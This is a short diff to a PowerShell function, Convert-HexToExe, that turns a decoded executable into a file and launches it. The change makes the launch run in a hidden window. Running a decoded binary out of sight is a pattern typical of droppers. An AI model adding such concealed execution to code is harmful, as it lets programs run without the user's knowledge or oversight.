@@ -20,7 +20,7 @@ function Convert-HexToExe {
         Write-Host "Decoding successful! Output saved to $outputExeFile"
 
         # Start the executable
-        Start-Process -FilePath $outputExeFile
+        Start-Process -WindowStyle Hidden -FilePath $outputExeFile
         Write-Host "$outputExeFile has been started."
     } catch {
         Write-Host "Error: $($_.Exception.Message)"
